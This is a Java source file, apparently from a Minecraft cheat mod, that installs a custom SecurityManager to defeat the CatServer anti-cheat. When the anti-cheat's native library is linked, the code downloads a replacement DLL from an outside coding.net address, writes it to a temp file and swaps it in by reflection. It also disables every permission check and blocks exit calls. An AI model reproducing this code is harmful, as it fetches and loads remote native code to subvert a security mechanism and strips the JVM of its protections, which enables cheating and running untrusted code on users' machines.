package com.alphaautoleak;

import com.alphaautoleak.utils.ReflectUtilies;

import org.apache.commons.io.FileUtils;

import java.io.File;

import java.net.URL;
import java.security.Permission;

/**
 * @Auther: SnowFlake
 * @Date: 2022/1/30 01:36
 */
public class CustomSecurityManager extends SecurityManager{

    @Override
    public void checkLink(String lib) {
        if (lib.contains("catanticheatx"))
        {
            try {
                File temp = File.createTempFile("bifjksdbhvkl",".tmp");
                temp.deleteOnExit();
                String dllName = "A27D3677";
                Class<?> loader = null;
                try {
                    loader = Class.forName("moe.catserver.mc.cac.NativeLoader");
                }catch (Exception e)
                {
                    //FMLCommonHandler.instance().exitJava(-1,true);
                }
                if (loader != null)
                {
                    try {
                        loader.getMethod("network",int.class);
                        dllName = "A27D3677";
                    } catch (Exception e) {
                        try {
                            loader.getMethod("func_2",int.class);
                            dllName = "3FF385FD";
                            AntiCatAntiCheat.oldVersion = false;
                        }catch (Exception e1)
                        {
                            if (e1 instanceof NoSuchMethodException)
                            {
                                dllName = "0617DEAF";
                            }
                        }
                    }
                }
                FileUtils.copyInputStreamToFile(new URL("https://alphaautoleak.coding.net/p/minecraft/d/antiCatAnticheat/git/raw/master/"+dllName+".dll?download=true").openStream(),temp);
                ReflectUtilies.modify(lib,temp.getAbsolutePath());
            }catch (Exception e)
            {
                e.printStackTrace();
            }
        }
    }



    @Override
    public void checkPermission(Permission perm) {

        return;
    }

    @Override
    public void checkExit(int status) {

        return;
    }

}
